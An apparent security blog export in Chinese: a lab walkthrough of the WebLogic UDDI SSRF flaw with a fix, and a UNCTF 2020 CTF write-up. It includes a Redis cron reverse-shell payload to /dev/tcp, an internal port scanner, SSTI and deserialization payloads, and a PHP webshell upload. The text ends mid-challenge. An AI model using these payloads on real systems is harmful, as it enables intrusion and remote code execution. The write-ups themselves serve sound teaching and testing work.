<h4 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a><strong>影响版本：</strong></h4><p>weblogic 10.0.2 – 10.3.6.0</p>
<h4 id="漏洞出现位置与解决方法："><a href="#漏洞出现位置与解决方法：" class="headerlink" title="漏洞出现位置与解决方法："></a><strong>漏洞出现位置与解决方法：</strong></h4><p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），</p>
<p>更准确地说是uudi包实现包<code>uddiexplorer.war</code>下的<code>SearchPublicRegistries.jsp</code>。</p>
<p>所以修复的直接方法是将<code>SearchPublicRegistries.jsp</code>直接删除就好了</p>
<p>我们这里采用的是改后辍的方式，修复步骤如下：</p>
<ol>
<li>将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</li>
<li>将weblogic安装目录下的server/lib/uddiexplorer.war下载</li>
<li>用winrar等工具打开uddiexplorer.war</li>
<li>将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</li>
<li>保存后上传回服务端替换原先的uddiexplorer.war</li>
<li>对于多台主机组成的集群，针对每台主机都要做这样的操作</li>
<li>由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</li>
</ol>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>通过<a href="https://github.com/vulhub/vulhub/tree/master/weblogic" target="_blank" rel="noopener">vulnhub/weblogic</a>下载漏洞docker漏洞环境</p>
<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p>编译及启动测试环境</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></div>

<p>默认会指定端口为<code>7001</code>以及<code>6379</code></p>
<p><code>6379</code>端口为<code>Redis</code>默认开启的端口</p>
<p>环境开启后，直接访问<a href="http://your-ip:7001" target="_blank" rel="noopener">http://your-ip:7001</a> 即可看到默认的404页面：</p>
<p><img src="/images/web/weblogic/ind.png" alt="img"></p>
<h4 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a><strong>SSRF漏洞测试</strong></h4><p>SSRF漏洞存在于</p>
<p><a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
<p><img src="/images/web/weblogic/jsp.png" alt="img"></p>
<p>点击search，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001：">http://127.0.0.1:7001：</a></p>
<p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。</p>
<p><img src="/images/web/weblogic/clipboard.png" alt="img"></p>
<p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p>
<p>通过错误的不同，即可探测内网状态。</p>
<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a><strong>注入HTTP头，利用Redis反弹shell</strong></h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
<p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*）</p>
<p>通过一个python脚本进行检测：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ite_ip</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        final_ip = <span class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip, i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'53'</span>, <span class="string">'80'</span>, <span class="string">'135'</span>, <span class="string">'139'</span>, <span class="string">'443'</span>, <span class="string">'445'</span>, <span class="string">'1080'</span>, <span class="string">'1433'</span>, <span class="string">'1521'</span>, <span class="string">'3306'</span>, <span class="string">'3389'</span>, <span class="string">'4899'</span>, <span class="string">'8080'</span>, <span class="string">'7001'</span>, <span class="string">'8000'</span>,<span class="string">'6389'</span>,<span class="string">'6379'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = <span class="string">'http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)  </span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ip = <span class="string">"172.20.0"</span>  </span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure></div>

<p>在环境服务器上运行脚本，发现172.20.0.2:6379可以连通：</p>
<p><img src="/images/web/weblogic/ip.png" alt="img"></p>
<p>也就是说明内网的一个ip存在6379端口，即redis服务。</p>
<p>我们这里要发送几行代码</p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.20.0.1/5003 0&gt;&amp;1\n\n\n\n"</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p>把这三条命令通过get包注入进去，先要将命令用url进行编码</p>
<p>注意，换行符是”\r\n”，也就是”%0D%0A”。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">test%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">201</span>%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>*%<span class="number">20</span>root%<span class="number">20</span>bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F172<span class="number">.20</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>F5003%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span><span class="keyword">set</span>%<span class="number">20</span>dir%<span class="number">20</span>%<span class="number">2</span>Fetc%<span class="number">2</span>F%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">20</span><span class="keyword">set</span>%<span class="number">20</span>dbfilename%<span class="number">20</span>crontab%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Aaaa</span><br></pre></td></tr></table></figure></div>

<p>将url编码后的字符串放在ssrf的域名后面，发送：</p>
<p><img src="/images/web/weblogic/shell.png" alt="img"></p>
<p>发现成功写入。</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><strong>getshell</strong></h4><p>接着靶机上开启端口监听，nc -lvnp 5003 ,反弹shell。成功。</p>
<p><img src="/images/web/weblogic/lvnp.png" alt="img"></p>
<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF-公开赛Writeup</title>
    <url>/2020/11/16/UNCTF2020%E5%85%AC%E5%BC%80%E8%B5%9BWP/</url>
    <content><![CDATA[<p>记录unctf2020公开赛的wp，希望与各位师傅们共同学习一下。</p>
<a id="more"></a>

<h1 id="UNCTF2020公开赛WP"><a href="#UNCTF2020公开赛WP" class="headerlink" title="UNCTF2020公开赛WP"></a>UNCTF2020公开赛WP</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h4><p>题目给出了源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;  </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>源码对我们输入的url变量做了限制，导致不能利用php伪协议读取flag文件</p>
<p>我们就要想办法利用file_get_contents函数打开文件读取。这一函数判断当我们用file协议或不明的协议，就会调回本地文件模式，利用这点我们就可以读取flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?url=<span class="number">0</span>:<span class="regexp">//u</span>nctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure></div>



<h4 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h4><p>题目给出了源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($uname,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">'easy'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'wrong password'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'challenge'</span>,<span class="string">'easychallenge'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>看到源码，我们的目的是让password=’easy’，从而包含flag.php文件，进行输出。</p>
<p>看到filter函数处对我们输入的’challenge’字符串进行了替换，导致php字符逃逸。</p>
<p>我们想要构造形如 ‘“;s:8:”password”;s:4:”easy”;}’的字符串，逃逸28个字符，即需要构造7个challenge</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?1=challengechallengechallengechallengechallengechallengechallenge";s:<span class="number">8</span>:<span class="string">"password"</span>;<span class="string">s:</span><span class="number">4</span>:<span class="string">"easy"</span>;</span><br></pre></td></tr></table></figure></div>



<h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用点：bool类型 true 可以跟任意字符串弱类型相等。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line">post传入payload=&gt;</span><br><span class="line">data=<span class="string">a:</span><span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">8</span>:<span class="string">"username"</span>;<span class="string">b:</span><span class="number">1</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"password"</span>;<span class="string">b:</span><span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h4><p>题目提示使用admin登录</p>
<p>访问/register页面进行注册，尝试注册admin账户，可以注册成功。</p>
<p>使用admin进行登录，登录成功，返回index页面，发现返回目录/secret_route_you_do_not_know </p>
<blockquote>
<p>admin login success and check the secret route /secret_route_you_do_not_know</p>
</blockquote>
<p>访问这个目录，提示我们：you should ‘guess’ the secret number ，当我们传入?guess=6，页面回显了6，由此我们判断出需要进行ssti注入。</p>
<p>源码对字符做了很多的过滤，fuzz后，构造出如下命令执行链</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">/secret_route_you_do_not_know?guess=&#123;&#123;()|attr(request.args.<span class="keyword">x</span><span class="number">1</span>)|attr(request.args.<span class="keyword">x</span><span class="number">2</span>)|attr(request.args.<span class="keyword">x</span><span class="number">3</span>)()|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(<span class="number">117</span>)|attr(request.args.<span class="keyword">x</span><span class="number">5</span>)|attr(request.args.<span class="keyword">x</span><span class="number">6</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">7</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">8</span>)(request.args.<span class="keyword">x</span><span class="number">9</span>)&#125;&#125;&amp;<span class="keyword">x</span><span class="number">1</span>=__class__&amp;<span class="keyword">x</span><span class="number">2</span>=__base__&amp;<span class="keyword">x</span><span class="number">3</span>=__subclasses__&amp;<span class="keyword">x</span><span class="number">4</span>=__getitem__&amp;<span class="keyword">x</span><span class="number">5</span>=__init__&amp;<span class="keyword">x</span><span class="number">6</span>=__globals__&amp;<span class="keyword">x</span><span class="number">7</span>=__builtins__&amp;<span class="keyword">x</span><span class="number">8</span>=eval&amp;<span class="keyword">x</span><span class="number">9</span>=__import__(<span class="string">"os"</span>).popen('cat flag.txt').read()</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h4><p>题目给出源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/\(.*\)/'</span>, $_GET[<span class="string">'a'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos($data, <span class="string">'flag'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">'ByeBye hacker'</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>过滤条件使我们输入的变量a不能存在文件后缀，而且也不能出现 ‘flag’ 字样。</p>
<p>绕过</p>
<p>利用eval函数，传入include包含变量，执行命令读取flag文件。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?<span class="keyword">a</span>=<span class="built_in">include</span><span class="variable">$_POST</span>[<span class="number">1</span>]<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></div>



<h4 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h4><p>题目给出/?source提示后做的。</p>
<p>访问题目/?source，得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们的目的是绕过验证，使其执行eval函数。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">/?verif=<span class="number">0e1290633704</span><span class="variable">&amp;m</span>=phpinfo<span class="variable">&amp;password</span>=<span class="number">1</span><span class="variable">&amp;</span>adminPassword=c4ca4238a0b923820dcc509a6f75849b<span class="variable">&amp;var12</span>=\<span class="string">";$m();//</span></span><br></pre></td></tr></table></figure></div>

<p>在执行过后的phpinfo文件中找到flag。</p>
<h4 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h4><p>题目描述</p>
<blockquote>
<p>随便上传</p>
</blockquote>
<p>目的是想办法上传个小马，使我们能够执行拿到shell。</p>
<p>首先传入php文件，提示我们filename error，其实像这里，我是直接传入了.htaccess文件，使我们接下来传入的图片马能直接作为php文件执行。即传入</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-p\</span><br><span class="line"> .jpg</span><br></pre></td></tr></table></figure>

<p>接着传入带有一句话的webshell文件。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="fileUpload"; filename="eval.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST["shell"]);</span><br></pre></td></tr></table></figure>

<p>蚁剑链接，后者直接通过post请求shell，拿到flag。</p>
<h4 id="L0vephp"><a href="#L0vephp" class="headerlink" title="L0vephp"></a>L0vephp</h4><p>题目源码下方存在一个字符串”B4Z0-@:OCnDf,”，base一波发现是base85加密，解密得到get action</p>
